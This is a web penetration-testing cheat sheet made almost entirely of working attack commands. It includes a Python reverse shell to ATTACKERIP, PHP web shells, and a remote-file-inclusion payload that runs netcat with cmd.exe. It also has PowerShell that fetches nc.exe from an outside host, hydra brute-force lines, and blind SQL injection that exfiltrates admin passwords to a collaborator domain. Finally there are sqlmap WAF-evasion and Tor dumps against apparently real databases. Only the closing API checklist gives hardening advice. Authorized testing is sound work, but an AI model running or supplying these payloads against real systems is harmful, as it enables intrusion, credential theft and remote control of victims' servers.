# Web

## Automatic web scanners

```text
# https://github.com/skavngr/rapidscan
python2 rapidscan.py example.com
# finalRecon
sudo python3 finalrecon.py --full https://example.com
# sn1per
sn1per -t example.com
# nikto2 
nikto -h example.com
```

## Quick tricks

```text
- Web ports for nmap
80,81,300,443,591,593,832,981,1010,1311,1099,2082,2095,2096,2480,3000,3128,3333,4243,4567,4711,4712,4993,5000,5104,5108,5280,5281,5800,6543,7000,7396,7474,8000,8001,8008,8014,8042,8069,8080,8081,8083,8088,8090,8091,8118,8123,8172,8222,8243,8280,8281,8333,8337,8443,8500,8834,8880,8888,8983,9000,9043,9060,9080,9090,9091,9200,9443,9800,9981,10000,11371,12443,16080,18091,18092,20720,55672

- Check redirects
https://url.com/redirect/?url=http://twitter.com/
http://www.theirsite.com@yoursite.com/
http://www.yoursite.com/http://www.theirsite.com/
http://www.yoursite.com/folder/www.folder.com
/http://twitter.com/
/\\twitter.com
/\/twitter.com
?c=.twitter.com/
/?redir=google。com
//google%E3%80%82com
//google%00.com
# Remember url enconde the payloads!

- Retrieve additional info:
/favicon.ico/..%2f
/lol.png%23
/../../../
?debug=1
/server-status
/files/..%2f..%2f

- Bypass Rate Limits:
• Use different params: 
    sign-up, Sign-up, SignUp
• Use different headers:
    X-Originating-IP: 127.0.0.1
    X-Forwarded-For: 127.0.0.1
    X-Remote-IP: 127.0.0.1
    X-Remote-Addr: 127.0.0.1
    X-Forwarded-For: 192.168.0.21 (Local IP 2 times
• Null byte on params:
    %00, %0d%0a, %09, %0C, %20, %0

- Bypass upload restrictions:
• Change extension: .pHp3 or pHp3.jpg
• Modify mimetype: Content-type: image/jpeg
• Bypass getimagesize(): exiftool -Comment='"; system($_GET['cmd']); ?>' file.jpg
• Add gif header: GIF89a;
• All at the same time.

- ImageTragic (memory leaks in gif preview)
# https://github.com/neex/gifoeb
./gifoeb gen 512x512 dump.gif
# Upload dump.gif multiple times, check if preview changes.
# Check docs for exploiting

• If upload from web is allowed or :
https://medium.com/@shahjerry33/pixel-that-steals-data-im-invisible-3c938d4c3888
https://iplogger.org/invisible/
https://iplogger.org/15bZ87

• Mitigation : Proxy all the objects from third-party resources and create a CSP. Although this is only one way of mitigation, their could be many.

- Check HTTP options:
• Check if it is possible to upload
curl -v -X OPTIONS http://10.11.1.111/
• If put enabled, upload:
curl -v -X PUT -d '' http://10.11.1.111/test/shell.php
nmap -p 80 192.168.1.124 --script http-put --script-args http-put.url='/test/rootme.php',http-put.file='/root/php-reverse-shell.php'
curl -v -X PUT -d '' http://VICTIMIP/test/cmd.php && http://VICTIMIP/test/cmd.php?cmd=python%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22ATTACKERIP%22,443));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/sh%22,%22-i%22]);%27
curl -i -X PUT -H “Content-Type: text/plain; charset=utf-8” -d “/root/Desktop/meterpreter.php” http://VICTIMIP:8585/uploads/meterpreter.php
• If PUT is not allowed, try to override:
X-HTTP-Method -Override: PUT

- Discover hidden parameters
# https://github.com/maK-/parameth
python parameth.py -u https://example.com/test.php

- .DS_Store files?
# https://github.com/gehaxelt/Python-dsstore
python main.py samples/.DS_Store.ctf

- Polyglot RCE payload
1;sleep${IFS}9;#${IFS}’;sleep${IFS}9;#${IFS}”;sleep${IFS}9;#${IFS}

- Nmap web scan
nmap --script "http-*" example.com -p 443

- SQLi + XSS + SSTI
'"><svg/onload=prompt(5);>{{7*7}}
' ==> for Sql injection 
"><svg/onload=prompt(5);> ==> for XSS 
{{7*7}} ==> for SSTI/CSTI
```

## Bruteforce

```text
cewl
hash-identifier
john --rules --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
medusa -h 10.11.1.111 -u admin -P password-file.txt -M http -m DIR:/admin -T 10
ncrack -vv --user offsec -P password-file.txt rdp://10.11.1.111
crowbar -b rdp -s 10.11.1.111/32 -u victim -C /root/words.txt -n 1
patator http_fuzz url=https://10.10.10.10:3001/login method=POST accept_cookie=1 body='{"user":"admin","password":"FILE0","email":""}' 0=/root/acronim_dict.txt follow=1 -x ignore:fgrep='HTTP/2 422'
hydra -l root -P password-file.txt 10.11.1.111 ssh
hydra -P password-file.txt -v 10.11.1.111 snmp
hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f 10.11.1.111 ftp -V
hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f 10.11.1.111 pop3 -V
hydra -P /usr/share/wordlistsnmap.lst 10.11.1.111 smtp -V
hydra -L username.txt -p paswordl33t -t 4 ssh://10.10.1.111
hydra -L user.txt -P pass.txt 10.10.1.111 ftp

# PATATOR
patator http_fuzz url=https://10.10.10.10:3001/login method=POST accept_cookie=1 body='{"user":"admin","password":"FILE0","email":""}' 0=/root/acronim_dict.txt follow=1 -x ignore:fgrep='HTTP/2 422'

# SIMPLE LOGIN GET
hydra -L cewl_fin_50.txt -P cewl_fin_50.txt 10.11.1.111 http-get-form "/~login:username=^USER^&password=^PASS^&Login=Login:Unauthorized" -V

# GET FORM with HTTPS
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.11.1.111 -s 443 -S https-get-form "/index.php:login=^USER^&password=^PASS^:Incorrect login/password\!"

# SIMPLE LOGIN POST
hydra -l root@localhost -P cewl 10.11.1.111 http-post-form "/otrs/index.pl:Action=Login&RequestedURL=&Lang=en&TimeOffset=-120&User=^USER^&Password=^PASS^:F=Login failed" -I

# API REST LOGIN POST
hydra -l admin -P /usr/share/wordlists/wfuzz/others/common_pass.txt -V -s 80 10.11.1.111 http-post-form "/centreon/api/index.php?action=authenticate:username=^USER^&password=^PASS^:Bad credentials" -t 64

# Password spraying bruteforcer
# https://github.com/x90skysn3k/brutespray
python brutespray.py --file nmap.gnmap -U /usr/share/wordlist/user.txt -P /usr/share/wordlist/pass.txt --threads 5 --hosts 5
```

## Online dictionaries

```text
https://www.cmd5.org/
http://hashes.org
https://www.onlinehashcrack.com/
https://gpuhash.me/
https://crackstation.net/
https://crack.sh/
https://hash.help/
https://passwordrecovery.io/
http://cracker.offensive-security.com/
https://md5decrypt.net/en/Sha256/
https://weakpass.com/wordlis
```

## Crawl/Fuzz

```text
# Crawlers
dirhunt https://url.com/
hakrawler -domain https://url.com/

# Fuzzers
# Best wordlists for fuzzing:
# https://github.com/danielmiessler/SecLists/tree/master/Discovery/Web-Content
    - raft-large-directories-lowercase.txt
    - directory-list-2.3-medium.txt
    - RobotsDisallowed/top10000.txt 

# ffuf
# Discover content
ffuf -recursion -c -e '.htm','.php','.html','.js','.txt','.zip','.bak','.asp','.aspx','.xml' -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt -u https://url.com/FUZZ
# Headers discover
ffuf -u https://hackxor.net -w /usr/share/SecLists/Discovery/Web-Content/BurpSuite-ParamMiner/both.txt -c -H "FUZZ: Hellothereheadertesting123 asd"
# Ffuf - burp
ffuf -replay-proxy http:127.0.0.1:8080

# Default login page
https://github.com/InfosecMatter/default-http-login-hunter
default-http-login-hunter.sh <URL>

# Dirsearch
dirsearch -r -f -u https://10.11.1.111 --extensions=htm,html,asp,aspx,txt -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt --request-by-hostname -t 40

# dirb
dirb http://10.11.1.111 -r -o dirb-10.11.1.111.txt

# wfuzz
wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/common.txt --hc 404 http://10.11.1.11/FUZZ

# gobuster
gobuster dir -u http://10.11.1.111 -w /usr/share/seclists/Discovery/Web_Content/common.txt -s '200,204,301,302,307,403,500' -e
gobuster dir -e -u http://10.11.1.111/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
gobuster dir -u http://$10.11.1.111 -w /usr/share/seclists/Discovery/Web_Content/Top1000-RobotsDisallowed.txt
gobuster dir -e -u http://10.11.1.111/ -w /usr/share/wordlists/dirb/common.txt
```

## LFI/RFI

```text
# LFI
**Tool**
# https://github.com/kurobeats/fimap
fimap -u "http://10.11.1.111/example.php?test="
# https://github.com/P0cL4bs/Kadimus
./kadimus -u localhost/?pg=contact -A my_user_agent
# https://github.com/wireghoul/dotdotpwn
dotdotpwn.pl -m http -h 10.11.1.111 -M GET -o unix

# Basic LFI
curl -s http://10.11.1.111/gallery.php?page=/etc/passwd
# PHP Filter b64
http://10.11.1.111/index.php?page=php://filter/convert.base64-encode/resource=/etc/passwd && base64 -d savefile.php
http://10.11.1.111/index.php?m=php://filter/convert.base64-encode/resource=config
http://10.11.1.111/maliciousfile.txt%00?page=php://filter/convert.base64-encode/resource=../config.php
# Nullbyte ending
http://10.11.1.111/page=http://10.11.1.111/maliciousfile.txt%00
# Other techniques
https://abc.redact.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c
https://abc.redact.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
https://abc.redact.com/static//..//..//..//..//..//..//..//..//..//..//..//..//..//..//../etc/passwd
https://abc.redact.com/static/../../../../../../../../../../../../../../../etc/passwd
https://abc.redact.com/static//..//..//..//..//..//..//..//..//..//..//..//..//..//..//../etc/passwd%00
https://abc.redact.com/static//..//..//..//..//..//..//..//..//..//..//..//..//..//..//../etc/passwd%00.html
https://abc.redact.com/asd.php?file:///etc/passwd
https://abc.redact.com/asd.php?file:///etc/passwd%00
https://abc.redact.com/asd.php?file:///etc/passwd%00.html
https://abc.redact.com/asd.php?file:///etc/passwd%00.ext
https://abc.redact.com/asd.php?file:///..//..//..//..//..//..//..//..//..//..//..//..//..//..//../etc/passwd%00.ext/etc/passwd
# LFI Windows
http://10.11.1.111/addguestbook.php?LANG=../../windows/system32/drivers/etc/hosts%00
http://10.11.1.111/addguestbook.php?LANG=/..//..//..//..//..//..//..//..//..//..//..//..//..//..//../boot.ini
http://10.11.1.111/addguestbook.php?LANG=../../../../../../../../../../../../../../../boot.ini
http://10.11.1.111/addguestbook.php?LANG=/..//..//..//..//..//..//..//..//..//..//..//..//..//..//../boot.ini%00
http://10.11.1.111/addguestbook.php?LANG=/..//..//..//..//..//..//..//..//..//..//..//..//..//..//../boot.ini%00.html
http://10.11.1.111/addguestbook.php?LANG=C:\\boot.ini
http://10.11.1.111/addguestbook.php?LANG=C:\\boot.ini%00
http://10.11.1.111/addguestbook.php?LANG=C:\\boot.ini%00.html
http://10.11.1.111/addguestbook.php?LANG=%SYSTEMROOT%\\win.ini
http://10.11.1.111/addguestbook.php?LANG=%SYSTEMROOT%\\win.ini%00
http://10.11.1.111/addguestbook.php?LANG=%SYSTEMROOT%\\win.ini%00.html
http://10.11.1.111/addguestbook.php?LANG=file:///C:/boot.ini
http://10.11.1.111/addguestbook.php?LANG=file:///C:/win.ini
http://10.11.1.111/addguestbook.php?LANG=C:\\boot.ini%00.ext
http://10.11.1.111/addguestbook.php?LANG=%SYSTEMROOT%\\win.ini%00.ext

- LFI using video upload:
https://github.com/FFmpeg/FFmpeg
https://hackerone.com/reports/226756
https://hackerone.com/reports/237381
https://docs.google.com/presentation/d/1yqWy_aE3dQNXAhW8kxMxRqtP7qMHaIfMzUDpEqFneos/edit
https://github.com/neex/ffmpeg-avi-m3u-xbin

# Contaminating log files
root@kali:~# nc -v 10.11.1.111 80
10.11.1.111: inverse host lookup failed: Unknown host
(UNKNOWN) [10.11.1.111] 80 (http) open
 <?php echo shell_exec($_GET['cmd']);?> 
http://10.11.1.111/addguestbook.php?LANG=../../xampp/apache/logs/access.log%00&cmd=ipconfig

# RFI:
http://10.11.1.111/addguestbook.php?LANG=http://10.11.1.111:31/evil.txt%00
Content of evil.txt:
<?php echo shell_exec("nc.exe 10.11.0.105 4444 -e cmd.exe") ?>
# RFI over SMB (Windows)
cat php_cmd.php
    <?php echo shell_exec($_GET['cmd']);?>
- Start SMB Server in attacker machine and put evil script
- Access it via browser (2 request attack):
    - http://10.11.1.111/blog/?lang=\\ATTACKER_IP\ica\php_cmd.php&cmd=powershell -c Invoke-WebRequest -Uri "http://10.10.14.42/nc.exe" -OutFile "C:\\windows\\system32\\spool\\drivers\\color\\nc.exe"
    - http://10.11.1.111/blog/?lang=\\ATTACKER_IP\ica\php_cmd.php&cmd=powershell -c "C:\\windows\\system32\\spool\\drivers\\color\\nc.exe" -e cmd.exe ATTACKER_IP 1234

- Cross Content Hijacking:
https://github.com/nccgroup/CrossSiteContentHijacking
https://soroush.secproject.com/blog/2014/05/even-uploading-a-jpg-file-can-lead-to-cross-domain-data-hijacking-client-side-attack/
http://50.56.33.56/blog/?p=242

- Encoding scripts in PNG IDAT chunk:
https://yqh.at/scripts_in_pngs.php
```

## File Upload Bypass

```text
- File name validation
    - extension blacklisted:
    pht,phpt,phtml,php3,php4,php5,php6
    - extension whitelisted:
    php%00.gif, shell.jpg.php
- Content type bypass
    - Preserve name, but change content-type
    Content-Type: image/jpeg, image/gif, image/png
- Content length:
    - Small bad code:
    <?='$_GET[x]'?>
    
# Filter Bypassing Techniques
- upload asp file using .cer & .asa extension (IIS — Windows)
- Upload .eml file when content-type = text/HTML
- Inject null byte shell.php%001.jpg
- Check for .svg file upload you can achieve stored XSS using XML payload
- put file name ../../logo.png or ../../etc/passwd/logo.png to get directory traversal via upload file
- Upload large size file for DoS attack test using the image.
- (magic number) upload shell.php change content-type to image/gif and start content with GIF89a; will do the job!
- If web app allows for zip upload then rename the file to pwd.jpg bcoz developer handle it via command
- upload the file using SQL command 'sleep(10).jpg you may achieve SQL if image directly saves to DB.

# Advance Bypassing techniques
- Imagetragick aka ImageMagick:
https://mukarramkhalid.com/imagemagick-imagetragick-exploit/
https://github.com/neex/gifoeb
    
# Upload file tool
https://github.com/almandin/fuxploider
python3 fuxploider.py --url https://example.com --not-regex "wrong file type"
```

## SQLi

```text
https://portswigger.net/web-security/sql-injection/cheat-sheet

SQLI Polyglots:
SLEEP(1) /*‘ or SLEEP(1) or ‘“ or SLEEP(1) or “*/

• MySQL:
• http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet
• https://websec.wordpress.com/2010/12/04/sqli-filter-evasion-cheat-sheet-mysql/

• MSQQL:
• http://evilsql.com/main/page2.php
• http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet

• ORACLE:
• http://pentestmonkey.net/cheat-sheet/sql-injection/oracle-sql-injection-cheat-sheet

• POSTGRESQL:
• http://pentestmonkey.net/cheat-sheet/sql-injection/postgres-sql-injection-cheat-sheet

• Others
• http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html
• http://pentestmonkey.net/cheat-sheet/sql-injection/ingres-sql-injection-cheat-sheet
• http://pentestmonkey.net/cheat-sheet/sql-injection/db2-sql-injection-cheat-sheet
• http://pentestmonkey.net/cheat-sheet/sql-injection/informix-sql-injection-cheat-sheet
• https://sites.google.com/site/0x7674/home/sqlite3injectioncheatsheet
• http://rails-sqli.org/
```

### **SQLi Basics**

```text
URL

Base:
https://insecure-website.com/products?category=Gifts
/?q=1
/?q=1'
/?q=1"
/?q=[1]
/?q[]=1
/?q=1`
/?q=1\
/?q=1/*'*/
/?q=1/*!1111'*/
/?q=1'||'asd'||'   <== concat string
/?q=1' or '1'='1
/?q=1 or 1=1
/?q='or''='

SQLi:
https://insecure-website.com/products?category=Gifts'--
https://insecure-website.com/products?category=Gifts'+OR+1=1--

LOGIN

User:
administrator'--
Password:
asdasdsa   

OTHER TABLES
' UNION SELECT username, password FROM users--        

GET VERSION INFO:

Microsoft,Mysql         SELECT @@version
Oracle                  SELECT * FROM v$version / SELECT banner FROM v$version / SELECT version FROM v$instance
PostgreSQL              SELECT version()
```

### **Blind SQLi**

```text
# Conditional Responses

Request with:
Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4

    In the DDBB it does:
    SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4' - If exists, show content or “Welcome back”

To detect:
TrackingId=x'+OR+1=1-- OK
TrackingId=x'+OR+1=2-- KO
# User admin exist
TrackingId=x'+UNION+SELECT+'a'+FROM+users+WHERE+username='administrator'-- OK
# Password length
TrackingId=x'+UNION+SELECT+'a'+FROM+users+WHERE+username='administrator'+AND+length(password)>1--

So, in the cookie header if first letter of password is greater than ‘m’, or ‘t’ or equal to ‘s’ response will be ok.

xyz' UNION SELECT 'a' FROM Users WHERE Username = 'Administrator' and SUBSTRING(Password, 1, 1) > 'm'--
xyz' UNION SELECT 'a' FROM Users WHERE Username = 'Administrator' and SUBSTRING(Password, 1, 1) > 't'--
xyz' UNION SELECT 'a' FROM Users WHERE Username = 'Administrator' and SUBSTRING(Password, 1, 1) = 's'--
z'+UNION+SELECT+'a'+FROM+users+WHERE+username='administrator'+AND+substring(password,6,1)='§a§'--

# Force conditional responses

TrackingId=x'+UNION+SELECT+CASE+WHEN+(1=1)+THEN+to_char(1/0)+ELSE+NULL+END+FROM+dual-- RETURNS ERROR IF OK
TrackingId=x'+UNION+SELECT+CASE+WHEN+(1=2)+THEN+to_char(1/0)+ELSE+NULL+END+FROM+dual-- RETURNS NORMALLY IF KO
TrackingId='+UNION+SELECT+CASE+WHEN+(username='administrator'+AND+substr(password,3,1)='§a§')+THEN+to_char(1/0)+ELSE+NULL+END+FROM+users--;

# Time delays
TrackingId=x'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
TrackingId=x'; IF (SELECT COUNT(username) FROM Users WHERE username = 'Administrator' AND SUBSTRING(password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--
TrackingId=x'; IF (1=2) WAITFOR DELAY '0:0:10'--
TrackingId=x'||pg_sleep(10)--
TrackingId=x'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+substring(password,1,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--

# Out-of-Band OAST (Collaborator)
Asynchronous response

Confirm:
TrackingId=x'+UNION+SELECT+extractvalue(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//x.burpcollaborator.net/">+%25remote%3b]>'),'/l')+FROM+dual--

Exfil:
TrackingId=x'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--
TrackingId=x'+UNION+SELECT+extractvalue(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.YOUR-SUBDOMAIN-HERE.burpcollaborator.net/">+%25remote%3b]>'),'/l')+FROM+dual--
```

### **UNIONs**

```text
' UNION SELECT username, password FROM users--    

Must match number of columns and its types (NULL):

Detect number of columns required:

' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--

or

' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--

    In Oracle: ' UNION SELECT NULL FROM DUAL--

Detect valid data column's datatype:

-Must match correct columns number

' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--       

Get values in 1 column:

' UNION SELECT username || '~' || password FROM users--
```

### **Second Order SQLi**

```text
A second-order SQL Injection, on the other hand, is a vulnerability exploitable in two different steps:
1. Firstly, we STORE a particular user-supplied input value in the DB and
2. Secondly, we use the stored value to exploit a vulnerability in a vulnerable function in the source code which constructs the dynamic query of the web application.

Example payload:
X' UNION SELECT user(),version(),database(), 4 --
X' UNION SELECT 1,2,3,4 --

- For example, in a password reset query with user "User123' --":

$pwdreset = mysql_query(“UPDATE users SET password=’getrekt’ WHERE username=’User123' — ‘ and password=’UserPass@123'”);

Will be:

$pwdreset = mysql_query(“UPDATE users SET password=’getrekt’ WHERE username=’User123'”);

So you don't need to know the password.

- User = ‘ or ’asd'='asd it will return always true
- User = admin'-- probably not check the password
```

### **sqlmap**

```text
# Post
./sqlmap.py -r search-test.txt -p tfUPass

# Get
sqlmap -u "http://10.11.1.111/index.php?id=1" --dbms=mysql

# Crawl
sqlmap -u http://10.11.1.111 --dbms=mysql --crawl=3

# Full auto - FORMS
sqlmap -u 'http://10.11.1.111:1337/978345210/index.php' --forms --dbs --risk=3 --level=5 --threads=4 --batch
# Columns 
sqlmap -u 'http://admin.cronos.htb/index.php' --forms --dbms=MySQL --risk=3 --level=5 --threads=4 --batch --columns -T users -D admin
# Values
sqlmap -u 'http://admin.cronos.htb/index.php' --forms --dbms=MySQL --risk=3 --level=5 --threads=4 --batch --dump -T users -D admin

sqlmap -o -u "http://10.11.1.111:1337/978345210/index.php" --data="username=admin&password=pass&submit=+Login+" --method=POST --level=3 --threads=10 --dbms=MySQL --users --passwords

SQLMAP WAF bypass

--level=5 --risk=3 --random-agent --user-agent -v3 --batch --threads=10 --dbs
--dbms="MySQL" -v3 --technique U --tamper="space2mysqlblank.py" --dbs
--dbms="MySQL" -v3 --technique U --tamper="space2comment" --dbs
-v3 --technique=T --no-cast --fresh-queries --banner
sqlmap -u http://www.example.com/index?id=1 --level 2 --risk 3 --batch --dbs


-f -b --current-user --current-db --is-dba --users --dbs

--risk=3 --level=5 --random-agent --user-agent -v3 --batch --threads=10 --dbs

--risk 3 --level 5 --random-agent --proxy http://123.57.48.140:8080 --dbs

--random-agent --dbms=MYSQL --dbs --technique=B"

--identify-waf --random-agent -v 3 --dbs

1 : --identify-waf --random-agent -v 3 --tamper="between,randomcase,space2comment" --dbs
2 : --parse-errors -v 3 --current-user --is-dba --banner -D eeaco_gm -T #__tabulizer_user_preferences --column --random-agent --level=5 --risk=3

--threads=10 --dbms=MYSQL --tamper=apostrophemask --technique=E -D joomlab -T anz91_session -C session_id --dump

--tables -D miss_db --is-dba --threads="10" --time-sec=10 --timeout=5 --no-cast --tamper=between,modsecurityversioned,modsecurityzeroversioned,charencode,greatest --identify-waf --random-agent

sqlmap.py -u http://192.168.0.107/test.php?id=1 -v 3 --dbms "MySQL" --technique U -p id --batch --tamper "space2morehash.py"

--banner --safe-url=2 --safe-freq=3 --tamper=between,randomcase,charencode -v 3 --force-ssl --dbs --threads=10 --level=2 --risk=2
-v3 --dbms="MySQL" --risk=3 --level=3 --technique=BU --tamper="space2mysqlblank.py" --random-agent -D damksa_abr -T admin,jobadmin,member --colu

sqlmap --wizard

sqlmap --level=5 --risk=3 --random-agent --tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,sp_password,space2comment,space2dash,space2mssqlblank,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes --dbms=mssql

sqlmap -url www.site.ps/index.php --level 5 --risk 3 tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords,xforwardedfor --dbms=mssql

sqlmap -url www.site.ps/index.php --level 5 --risk 3 tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,sp_password,space2comment,space2dash,space2mssqlblank,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes --dbms=mssql

--tamper "randomcase.py" --tor --tor-type=SOCKS5 --tor-port=9050 --dbs --dbms "MySQL" --current-db --random-agent

--tamper "randomcase.py" --tor --tor-type=SOCKS5 --tor-port=9050 --dbs --dbms "MySQL" --current-db --random-agent -D "pache_PACHECOCARE" --tables

--tamper "randomcase.py" --tor --tor-type=SOCKS5 --tor-port=9050 --dbs --dbms "MySQL" --current-db --random-agent -D "pache_PACHECOCARE" -T "edt_usuarios" --columns

--tamper "randomcase.py" --tor --tor-type=SOCKS5 --tor-port=9050 --dbs --dbms "MySQL" --current-db --random-agent -D "pache_PACHECOCARE" -T "edt_usuarios" -C "ud,email,usuario,contra" --dump

tamper=between.py,charencode.py,charunicodeencode.py,equaltolike.py,greatest.py,multiplespaces.py,nonrecursivereplacement.py,percentage.py,randomcase.py,securesphere.py,sp_password.py,space2comment.py,space2dash.py,space2mssqlblank.py,space2mysqldash.py,space2plus.py,space2randomblank.py,unionalltounion.py,unmagicquotes.py --dbms=mssql
```

## APIs

```text
REST uses: HTTP, JSON , URL and XML
SOAP uses: mostly HTTP and XML

# Tools
https://github.com/Fuzzapi/fuzzapi
https://github.com/Fuzzapi/API-fuzzer

Checklist:
•  Basic auth, OAuth or JWT
•  Login meets the standards
•  Encryption in sensible fields
•  Test from most vulnerable to less
   ◇ Organization's user management
   ◇ Export to CSV/HTML/PDF
   ◇ Custom views of dashboards
   ◇ Sub user creation&management
   ◇ Object sharing (photos, posts,etc)
• Archive.org
• Censys
• VirusTotal

JWT (JSON Web Token)
•  Use a random complicated key (JWT Secret) to make brute forcing the token very hard.
•  Don't extract the algorithm from the header. Force the algorithm in the backend (HS256 or RS256).
•  Make token expiration (TTL, RTTL) as short as possible.
•  Don't store sensitive data in the JWT payload, it can be decoded easily.

OAuth
•  Always validate redirect_uri server-side to allow only whitelisted URLs.
•  Always try to exchange for code and not tokens (don't allow response_type=token).
•  Use state parameter with a random hash to prevent CSRF on the OAuth authentication process.
•  Define the default scope, and validate scope parameters for each application.

Access
•  Limit requests (Throttling) to avoid DDoS / brute-force attacks.
•  Use HTTPS on server side to avoid MITM (Man in the Middle Attack).
•  Use HSTS header with SSL to avoid SSL Strip attack.
•  Check distinct login paths /api/mobile/login | /api/v3/login | /api/magic_link
•  Even id is not numeric, try it /?user_id=111 instead /?user_id=user@mail.com
•  Bruteforce login
•  Try mobile API versions

Input
•  Use the proper HTTP method according to the operation: GET (read), POST (create), PUT/PATCH (replace/update), and DELETE (to delete a record), and respond with 405 Method Not Allowed if the requested method isn't appropriate for the requested resource.
•  Validate content-type on request Accept header (Content Negotiation) to allow only your supported format (e.g. application/xml, application/json, etc.) and respond with 406 Not Acceptable response if not matched.
•  Validate content-type of posted data as you accept (e.g. application/x-www-form-urlencoded, multipart/form-data, application/json, etc.).
•  Validate user input to avoid common vulnerabilities (e.g. XSS, SQL-Injection, Remote Code Execution, etc.).
•  Don't use any sensitive data (credentials, Passwords, security tokens, or API keys) in the URL, but use standard Authorization header.
•  Use an API Gateway service to enable caching, Rate Limit policies (e.g. Quota, Spike Arrest, or Concurrent Rate Limit) and deploy APIs resources dynamically.
• Try input injections in ALL params
• Try execute operating system command 
   ◇ Linux :api.url.com/endpoint?name=file.txt;ls%20/
• XXE
   ◇ <!DOCTYPE test [ <!ENTITY xxe SYSTEM “file:///etc/passwd”> ]>
• SSRF
• Check distinct versions api/v{1..3}
• If REST API try to use as SOAP changing the content-type to "application/xml" and sent any simple xml to body
• IDOR in body/header is more vulnerable than ID in URL
• IDOR:
   ◇ Understand real private resources that only belongs specific user
   ◇ Understand relationships receipts-trips
   ◇ Understand roles and groups
   ◇ If REST API, change GET to other method Add a “Content-length” HTTP header or Change the “Content-type”
   ◇ If get 403/401 in api/v1/trips/666 try 50 random IDs from 0001 to 9999
• Bypass IDOR limits:
   ◇ Wrap ID with an array {“id”:111} --> {“id”:[111]}
   ◇ JSON wrap {“id”:111} --> {“id”:{“id”:111}}
   ◇ Send ID twice URL?id=<LEGIT>&id=<VICTIM>
   ◇ Send wildcard {"user_id":"*"}
   ◇ Param pollution 
      ▪ /api/get_profile?user_id=<victim’s_id>&user_id=<user_id>
      ▪ /api/get_profile?user_id=<legit_id>&user_id=<victim’s_id>
      ▪ JSON POST: api/get_profile {“user_id”:<legit_id>,”user_id”:<victim’s_id>}
      ▪ JSON POST: api/get_profile {“user_id”:<victim’s_id>,”user_id”:<legit_id>}
      ▪ Try wildcard instead ID
• If .NET app and found path, Developers sometimes use "Path.Combine(path_1,path_2)" to create full path. Path.Combine has weird behavior: if param#2 is absolute path, then param#1 is ignored.
   ◇ https://example.org/download?filename=a.png -> https://example.org/download?filename=C:\\inetpub\wwwroot\a.png
   ◇ Test: https://example.org/download?filename=\\smb.dns.praetorianlabs.com\a.png
• Found a limit / page param? (e.g: /api/news?limit=100) It might be vulnerable to Layer 7 DoS. Try to send a long value (e.g: limit=999999999) and see what happens :)

Processing
•  Check if all the endpoints are protected behind authentication to avoid broken authentication process.
•  User own resource ID should be avoided. Use /me/orders instead of /user/654321/orders.
•  Don't auto-increment IDs. Use UUID instead.
•  If you are parsing XML files, make sure entity parsing is not enabled to avoid XXE (XML external entity attack).
•  If you are parsing XML files, make sure entity expansion is not enabled to avoid Billion Laughs/XML bomb via exponential entity expansion attack.
•  Use a CDN for file uploads.
•  If you are dealing with huge amount of data, use Workers and Queues to process as much as possible in background and return response fast to avoid HTTP Blocking.
•  Do not forget to turn the DEBUG mode OFF.
• If found GET /api/v1/users/<id> try DELETE / POST to create/delete users
• Test less known endpoint POST /api/profile/upload_christmas_voice_greeting

Output
•  Send X-Content-Type-Options: nosniff header.
•  Send X-Frame-Options: deny header.
•  Send Content-Security-Policy: default-src 'none' header.
•  Remove fingerprinting headers - X-Powered-By, Server, X-AspNet-Version, etc.
